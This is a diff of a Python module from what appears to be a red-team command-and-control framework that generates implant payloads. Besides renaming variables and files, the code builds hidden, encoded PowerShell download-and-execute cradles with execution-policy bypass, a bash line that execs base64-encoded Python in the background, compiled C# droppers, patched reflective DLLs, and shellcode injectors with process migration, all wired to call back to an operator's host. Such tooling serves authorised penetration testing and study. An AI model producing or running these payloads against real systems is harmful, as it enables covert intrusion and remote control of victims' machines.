@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 
-from Config import PayloadsDirectory, QuickCommand, FilesDirectory
+from Config import PayloadsDirectory, QuickCommand, FilesDirectory, DefaultMigrationProcess
 from Colours import Colours
 from Utils import gen_key, randomuri, formStrMacro, formStr
 import StringIO, gzip, io, base64, subprocess, os, hashlib, re
@@ -26,19 +26,19 @@ class Payloads(object):
     self.Referrer = Referrer
     self.ConnectURL = ConnectURL
     self.BaseDirectory = BaseDirectory
-    self.C2Core = ""
-    self.Python = ""
+    self.PSDropper = ""
+    self.PyDropper = ""
     if os.path.exists("%saes.py" % PayloadsDirectory):
       with open("%saes.py" % PayloadsDirectory, 'rb') as f:
         content = f.read()
         import re
         m = re.search('#KEY(.+?)#KEY', content)
         if m: keyfound = m.group(1)
-        self.PythonHash = hashlib.sha512(content).hexdigest()
-        self.PythonKey = keyfound
+        self.PyDropperHash = hashlib.sha512(content).hexdigest()
+        self.PyDropperKey = keyfound
     else:
-      self.PythonKey = gen_key()
-      randomkey = self.PythonKey
+      self.PyDropperKey = gen_key()
+      randomkey = self.PyDropperKey
       with open("%saes.py" % FilesDirectory, 'rb') as f:
         content = f.read()
       aespy = content.replace("#REPLACEKEY#","#KEY%s#KEY" % randomkey)
@@ -46,11 +46,11 @@ class Payloads(object):
       output_file = open(filename, 'w')
       output_file.write(aespy)
       output_file.close()
-      self.PythonHash = hashlib.sha512(aespy).hexdigest()
+      self.PyDropperHash = hashlib.sha512(aespy).hexdigest()
 
     cs = content.replace("#REPLACEKILLDATE#",self.KillDate)
-    cs1 = cs.replace("#REPLACEPYTHONHASH#",self.PythonHash)
-    cs2 = cs1.replace("#REPLACESPYTHONKEY#",self.PythonKey)
+    cs1 = cs.replace("#REPLACEPYTHONHASH#",self.PyDropperHash)
+    cs2 = cs1.replace("#REPLACESPYTHONKEY#",self.PyDropperKey)
     cs3 = cs2.replace("#REPLACEKEY#",self.Key)
     cs4 = cs3.replace("#REPLACEHOSTPORT#",(self.HostnameIP+":"+self.Serverport))
     cs5 = cs4.replace("#REPLACEQUICKCOMMAND#",(self.HostnameIP+":"+self.Serverport+"/"+QuickCommand+"_py"))
@@ -73,7 +73,7 @@ class Payloads(object):
     cs9 = cs8.replace("#REPLACECONNECT#",self.ConnectURL)
     cs10 = cs9.replace("#REPLACEUSERAGENT#",self.UserAgent)
     cs11 = cs10.replace("#REPLACEREFERER#",self.Referrer)
-    self.C2Core = cs11.replace("#REPLACEKEY#",self.Key)
+    self.PSDropper = cs11.replace("#REPLACEKEY#",self.Key)
      
   def QuickstartLog(self, txt):
     if not self.quickstart: self.quickstart = ''
@@ -89,7 +89,7 @@ class Payloads(object):
   def CreateRawBase(self, full=False):
     out = StringIO.StringIO()
     with gzip.GzipFile(fileobj=out, mode="w") as f:
-      f.write((self.C2Core))
+      f.write((self.PSDropper))
     gzipdata = base64.b64encode(out.getvalue())
     b64gzip = "IEX(New-Object IO.StreamReader((New-Object System.IO.Compression.GzipStream([IO.MemoryStream][Convert]::FromBase64String('%s'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()" % gzipdata
     batfile = "powershell -exec bypass -Noninteractive -windowstyle hidden -e " + base64.b64encode(b64gzip.encode('UTF-16LE'))
@@ -101,12 +101,12 @@ class Payloads(object):
   def CreateRaw(self, name=""):
     out = StringIO.StringIO()
     with gzip.GzipFile(fileobj=out, mode="w") as f:
-      f.write((self.C2Core))
+      f.write((self.PSDropper))
     gzipdata = base64.b64encode(out.getvalue())
     b64gzip = "IEX(New-Object IO.StreamReader((New-Object System.IO.Compression.GzipStream([IO.MemoryStream][Convert]::FromBase64String('%s'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()" % gzipdata
     filename = "%s%spayload.txt" % (self.BaseDirectory,name)
     output_file = open(filename, 'w')
-    output_file.write(self.C2Core)
+    output_file.write(self.PSDropper)
     output_file.close()
     self.QuickstartLog("Raw Payload written to: %s" % filename)
 
@@ -126,7 +126,7 @@ class Payloads(object):
     output_file.write(base64.b64decode(dll))
     output_file.close()
 
-    srcfilename = "%s%s%s" % (self.BaseDirectory,name,"Sharp.dll")
+    srcfilename = "%s%s%s" % (self.BaseDirectory,name,"dropper_cs.dll")
     with open(srcfilename, "rb") as b:
       dllbase64 = base64.b64encode(b.read())
 
@@ -152,7 +152,7 @@ class Payloads(object):
 
     out = StringIO.StringIO()
     with gzip.GzipFile(fileobj=out, mode="w") as f:
-      f.write((self.C2Core))
+      f.write((self.PSDropper))
     gzipdata = base64.b64encode(out.getvalue())
     b64gzip = "sal a New-Object;iex(a IO.StreamReader((a System.IO.Compression.GzipStream([IO.MemoryStream][Convert]::FromBase64String(\"%s\"),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()" % gzipdata
     patchlen = 16000 - len((base64.b64encode(b64gzip.encode('UTF-16LE'))).encode('UTF-16LE'))
@@ -184,20 +184,20 @@ class Payloads(object):
     cs8 = cs7.replace("#REPLACEPROXYUSER#",self.Proxyuser)
     cs9 = cs8.replace("#REPLACEPROXYPASSWORD#",self.Proxypass)
     
-    self.QuickstartLog("C# Payload written to: %s%sdropper.cs" % (self.BaseDirectory,name))
+    self.QuickstartLog("C# Dropper Payload written to: %s%sdropper.cs" % (self.BaseDirectory,name))
     filename = "%s%sdropper.cs" % (self.BaseDirectory,name)
     output_file = open(filename, 'w')
     output_file.write(cs9)
     output_file.close()
     if os.name == 'nt':
-        compile = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe %s%sdropper.cs -o %s%sSharp.exe" % (self.BaseDirectory, name, self.BaseDirectory, name)
+        compile = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe %s%sdropper.cs -o %s%sdropper_cs.exe" % (self.BaseDirectory, name, self.BaseDirectory, name)
     else:
-        compile = "mono-csc %s%sdropper.cs -out:%s%sSharp.dll -target:library -warn:2" % (self.BaseDirectory,name,self.BaseDirectory,name)
-        compileexe = "mono-csc %s%sdropper.cs -out:%s%sSharp.exe -target:exe -warn:2" % (self.BaseDirectory,name,self.BaseDirectory,name)
+        compile = "mono-csc %s%sdropper.cs -out:%s%sdropper_cs.dll -target:library -warn:2" % (self.BaseDirectory,name,self.BaseDirectory,name)
+        compileexe = "mono-csc %s%sdropper.cs -out:%s%sdropper_cs.exe -target:exe -warn:2" % (self.BaseDirectory,name,self.BaseDirectory,name)
     subprocess.check_output(compile, shell=True)
-    self.QuickstartLog("C# DLL written to: %s%sSharp.dll" % (self.BaseDirectory,name))
+    self.QuickstartLog("C# Dropper DLL written to: %s%sdropper_cs.dll" % (self.BaseDirectory,name))
     subprocess.check_output(compileexe, shell=True)
-    self.QuickstartLog("C# EXE written to: %s%sSharp.exe" % (self.BaseDirectory,name))
+    self.QuickstartLog("C# Dropper EXE written to: %s%sdropper_cs.exe" % (self.BaseDirectory,name))
           
     # Load CLR "v2.0.50727"
     self.QuickstartLog("" + Colours.END)
@@ -220,6 +220,8 @@ class Payloads(object):
     self.PatchBytes("%sPosh_v4_x64.dll" % name, v4_64, 0x00014F00, "DLL")
     
     # Load CLR "v4.0.30319"
+    self.QuickstartLog("" + Colours.END)
+    self.QuickstartLog("ReflectiveDLL that loads C# Implant in CLR v4.0.30319 - DLL Export (VoidFunc)" + Colours.GREEN)
     with open('%sSharp_v4_x86_dll.b64' % FilesDirectory, 'r') as f:
         v4_86 = f.read() 
     self.PatchSharpBytes("%sSharp_v4_x86.dll" % name, v4_86, 0x00012F80, "")
@@ -348,11 +350,11 @@ ao.run('%s', 0);window.close();
 
   def CreateCS(self):
     basefile = self.CreateRawBase()
-    with open("%sPosh.cs" % FilesDirectory, 'rb') as f:
+    with open("%sSharp_Powershell_Runner.cs" % FilesDirectory, 'rb') as f:
       content = f.read()
     cs = content.replace("#REPLACEME#",basefile)
-    self.QuickstartLog("CS Payload written to: %sPosh.cs" % self.BaseDirectory)
-    filename = "%sPosh.cs" % (self.BaseDirectory)
+    self.QuickstartLog("CS Powershell Stager source written to: %sSharp_Posh_Stager.cs" % self.BaseDirectory)
+    filename = "%sSharp_Posh_Stager.cs" % (self.BaseDirectory)
     output_file = open(filename, 'w')
     output_file.write(cs)
     output_file.close()
@@ -363,16 +365,16 @@ ao.run('%s', 0);window.close();
     with open("%sdropper.py" % FilesDirectory, 'rb') as f:
       content = f.read()
     cs = content.replace("#REPLACEKILLDATE#",self.KillDate)
-    cs1 = cs.replace("#REPLACEPYTHONHASH#",self.PythonHash)
-    cs2 = cs1.replace("#REPLACESPYTHONKEY#",self.PythonKey)
+    cs1 = cs.replace("#REPLACEPYTHONHASH#",self.PyDropperHash)
+    cs2 = cs1.replace("#REPLACESPYTHONKEY#",self.PyDropperKey)
     cs3 = cs2.replace("#REPLACEKEY#",self.Key)
     cs4 = cs3.replace("#REPLACEHOSTPORT#",(self.HostnameIP+":"+self.Serverport))
     cs5 = cs4.replace("#REPLACEQUICKCOMMAND#",(self.HostnameIP+":"+self.Serverport+"/"+QuickCommand+"_py"))
     cs6 = cs5.replace("#REPLACECONNECTURL#",(self.HostnameIP+":"+self.Serverport+self.ConnectURL+"?m"))
     cs7 = cs6.replace("#REPLACEDOMAINFRONT#",self.DomainFrontHeader)
-    self.Python = cs7.replace("#REPLACEUSERAGENT#",self.UserAgent)
+    self.PyDropper = cs7.replace("#REPLACEUSERAGENT#",self.UserAgent)
 
-    py = base64.b64encode(self.Python)
+    py = base64.b64encode(self.PyDropper)
     pydropper_bash = "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | python &" % py
     filename = "%s%spy_dropper.sh" % (self.BaseDirectory,name)
     output_file = open(filename, 'w')
@@ -392,7 +394,7 @@ ao.run('%s', 0);window.close();
     hexcode = "".join("\\x{:02x}".format(ord(c)) for c in sc64)
     sc64 = formStr("char sc[]",hexcode)
 
-    with open("%sShellcode.c" % FilesDirectory, 'rb') as f:
+    with open("%sShellcode_Injector.c" % FilesDirectory, 'rb') as f:
       content = f.read()
     ccode = content.replace("#REPLACEME#",sc64)
     self.QuickstartLog("64bit EXE Payload written to: %s%sPosh64.exe" % (self.BaseDirectory,name))
@@ -401,9 +403,13 @@ ao.run('%s', 0);window.close();
     output_file.write(ccode)
     output_file.close()
 
-    with open("%sShellcode_migrate.c" % FilesDirectory, 'rb') as f:
+    with open("%sShellcode_Injector_Migrate.c" % FilesDirectory, 'rb') as f:
       content = f.read()
     ccode = content.replace("#REPLACEME#",sc64)
+    migrate_process = DefaultMigrationProcess
+    if "\\" in migrate_process and "\\\\" not in migrate_process:
+      migrate_process = migrate_process.replace("\\", "\\\\")
+    ccode = ccode.replace("#REPLACEMEPROCESS#", migrate_process)
     self.QuickstartLog("64bit EXE Payload written to: %s%sPosh64_migrate.exe" % (self.BaseDirectory,name))
     filename = "%s%sPosh64_migrate.c" % (self.BaseDirectory,name)
     output_file = open(filename, 'w')
@@ -415,7 +421,7 @@ ao.run('%s', 0);window.close();
     hexcode = "".join("\\x{:02x}".format(ord(c)) for c in sc32)
     sc32 = formStr("char sc[]",hexcode)
 
-    with open("%sShellcode.c" % FilesDirectory, 'rb') as f:
+    with open("%sShellcode_Injector.c" % FilesDirectory, 'rb') as f:
       content = f.read()
     ccode = content.replace("#REPLACEME#",sc32)
     self.QuickstartLog("32bit EXE Payload written to: %s%sPosh32.exe" % (self.BaseDirectory,name))
@@ -424,7 +430,7 @@ ao.run('%s', 0);window.close();
     output_file.write(ccode)
     output_file.close()
 
-    with open("%sShellcode_migrate.c" % FilesDirectory, 'rb') as f:
+    with open("%sShellcode_Injector_Migrate.c" % FilesDirectory, 'rb') as f:
       content = f.read()
     ccode = content.replace("#REPLACEME#",sc32)
     self.QuickstartLog("32bit EXE Payload written to: %s%sPosh32_migrate.exe" % (self.BaseDirectory,name))
